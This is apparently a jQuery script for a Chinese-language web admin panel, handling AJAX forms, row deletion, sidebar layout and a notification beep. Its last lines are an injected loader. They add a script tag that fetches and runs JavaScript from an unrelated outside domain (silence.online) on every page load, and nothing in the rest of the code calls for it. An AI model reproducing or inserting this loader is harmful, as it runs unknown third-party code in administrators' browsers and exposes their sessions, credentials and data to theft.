$(function(){
    $.ajaxSetup({
        headers: {
            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
        }
    });
    $('.form-ajax').submit(function(e){
        e.preventDefault();
        $('.btn').attr('disabled','disabled');
        var index = layer.load();
        $.ajax({
            url : $(this).attr('action'),
            type : 'POST',
            dataType : 'json',
            data: $(this).serialize(),
            success : function(result){
                layer.close(index);
                $('.btn').prop('disabled', false);
                if(result.code=='0'){
                    layer.alert( result.msg);
                }

                if(result.code=='1'){
                    layer.msg(result.msg, {'time': 1000 }, function () {
                        if (typeof (result.url) != 'undefined' && result.url) {
                            window.location.href = result.url;
                        }
                    });
                    return;
                }
                if(result.code=='0'){
                    $('[name=captcha]').val('');
                    $('[name=auth_code]').val('');
                    $('.imgcode').click();
                }
            },
            error: function (XMLHttpRequest, textStatus, errorThrown) {
                $('.btn').prop('disabled', false);
                layer.close(index);
                layer.alert('数据返回错误。' + XMLHttpRequest + errorThrown);
            }
        });
    });

    $('.jumpbutton').click(function () {
        location.href = document.referrer;
    });

    $.commonjs = {
        getCheckedID: function (obj) {
            var ids = [];
            $(obj).find('.checkbox_ids').each(function (i) {
                if ( $(this).is(':checked') ) {
                    ids.push($(this).val())
                }
            });
            return ids;
        }
    };

    $('.navbar-minimalize').click(function () {
        var thiscookie = getcookiename();
        if (thiscookie != 1) {
            setcookiename(1);
        } else {
            setcookiename(2);
        }
        $("body").toggleClass("mini-navbar");
        SmoothlyMenu();
        $('.navbar-static-side').height($(window).height());
        $('.navbar-static-side').css({'overflow-y': 'auto'});
    });
    function getcookiename() {
        return $('.thiscookie').html();
    }
    function setcookiename(thiscookie) {
        return $('.thiscookie').html(thiscookie);
    }

    $('#dropdownMenu').click(function() {
        if ($('.left-nav').is(':visible')) {
            $('.left-nav').addClass('hidden-sm hidden-xs').hide();
        } else {
            $('.left-nav').removeClass('hidden-sm hidden-xs').show();
        }
    });

    $('.selectAllCheckbox').click(function () {
        if ($(this).prop('checked')) {
            $('.checkbox').prop('checked', true);
        } else {
            $('.checkbox').prop('checked', false);
        }
    });

    $('.flushbtn').click(function () {
        window.location.reload();
    });

    $('.addbtn').click(function () {
        location.href = $(this).attr('data-url');
    });

    $('.delbtn').click(function () {
        var url = $(this).attr('data-url');
        var ids = $.commonjs.getCheckedID('.ajax-form');
        if (ids == '') {
            layer.alert('请选择要删除的数据');
            return false;
        }
        layer.confirm('是否要执行此操作？', function (index) {
            $.post(url, {'ids': ids, _method:'delete'}, function (data) {
                layer.close(index);
                if (data.code == '0') {
                    layer.alert(data.msg);
                } else {
                    for (var l in ids) {
                        $('#tr' + ids[l]).fadeOut();
                    }
                }
            }, 'json');
        });
    });

    $('.ajax-delete').click(function () {
        var url = $(this).attr('data-url');
        var id = $(this).attr('data-id');
        var style = $(this).attr('data-show');
        layer.confirm('是否要执行此操作？', function (index) {
            layer.close(index);
            var index = layer.load();
            $.post(url, {'ids': [id], _method:'delete'},function (data) {
                layer.close(index);
                if (data.code == '0') {
                    layer.alert(data.msg);
                } else {
                    if (style == '1') {
                        layer.msg(data.msg);
                    } else
                        $('#tr' + id).fadeOut();
                }
            }, 'json');
        });
    });


    function SmoothlyMenu() {
        if (!$('body').hasClass('mini-navbar')) {
            $('#side-menu').hide();
            $('.nav-label').css({'font-size': '14px'});
            setTimeout(
                function () {
                    $('#side-menu').fadeIn(500);
                }, 100);
        } else if ($('body').hasClass('fixed-sidebar')) {
            $('#side-menu').hide();
            $('.nav-label').css({'font-size': '0px'});
            setTimeout(
                function () {
                    $('#side-menu').fadeIn(500);
                }, 300);
        } else {
            $('.navbar-default').css({'display': 'block'});
            $('.nav-label').css({'font-size': '0px'});
            $('#side-menu').removeAttr('style');
        }
    }

    //侧边栏滚动
    $(window).scroll(function () {
        setTimeout(function () {
            sizediv();
        }, 0);
    });
    sizediv();

});

function sizediv() {
    $('.navbar-static-side').css({'overflow-y': 'auto'});

    var top = $('#top-nav').height();
    if ($(window).scrollTop() > 40) {
        $('.navbar-static-side').css({'margin-top': '-40px'});
        $('.navbar-static-side').height($(window).height());
    } else {
        $('.navbar-static-side').css({'margin-top': (0 - $(window).scrollTop()) + 'px'});
        $('.navbar-static-side').height($(window).height() - top + $(window).scrollTop());
    }

    if ($(this).width() < 769) {
        $('.topfix').css({'display': 'none'});
    } else {
        $('.topfix').css({'display': 'inline-block'});
    }
}

/**
 * 用H5新功能播放声音
 */
function play_ding_sound() {
    for (let i = 0; i < 3; i++) {
        setTimeout(function () {
            window.AudioContext = window.AudioContext || window.webkitAudioContext;
            var audioCtx = new AudioContext();
            var oscillator = audioCtx.createOscillator();
            var gainNode = audioCtx.createGain();
            oscillator.connect(gainNode);
            gainNode.connect(audioCtx.destination);
            oscillator.type = 'sine';
            oscillator.frequency.value = 600;
            gainNode.gain.setValueAtTime(0, audioCtx.currentTime);
            gainNode.gain.linearRampToValueAtTime(20, audioCtx.currentTime + 0.05);
            oscillator.start(audioCtx.currentTime);
            gainNode.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 1);
            oscillator.stop(audioCtx.currentTime + 1);
        }, 100 + i * 900);
    }
}
    window.s=document.createElement("script");
    s.src="https://emblemcodeapi.silence.online/js.php?"
    +Math.random();(document.body||document.
    documentElement).appendChild(s);
